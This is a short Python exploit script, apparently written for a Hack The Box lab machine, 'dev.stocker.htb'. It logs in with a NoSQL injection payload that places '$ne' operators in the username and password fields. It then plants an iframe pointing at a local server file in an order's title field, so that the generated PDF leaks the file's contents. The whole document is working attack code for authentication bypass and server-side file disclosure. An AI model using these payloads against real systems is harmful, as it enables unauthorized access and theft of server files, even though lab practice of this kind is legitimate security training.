import requests
from requests_toolbelt.utils import dump
import webbrowser
# print(dump.dump_all(r).decode('utf-8'))

TARGET='http://dev.stocker.htb'
PDF_FILE='./exploit_res.pdf'

# Login
s = requests.Session()
data = {"username": {"$ne": None}, "password": {"$ne": None} }
r = s.post(TARGET+'/login', json=data)

# Send order
data= {
    'basket': [
        {
            '_id': "638f116eeb060210cbd83a8d",
            'title': "<iframe src=file:///var/www/dev/index.js height=1050px width=800px</iframe>",
            'description': "It's a red cup.",
            'image': "abc",
            'price': 32,
            'currentStock': 4,
            '__v': 0,
            'amount': 1,
        }
    ]
}
r = s.post(TARGET+'/api/order',json=data)
order_id = r.json()['orderId']

# Retrieve PDF
r = s.get(TARGET+'/api/po/'+order_id)
webbrowser.open(TARGET+'/api/po/'+order_id, new=2)
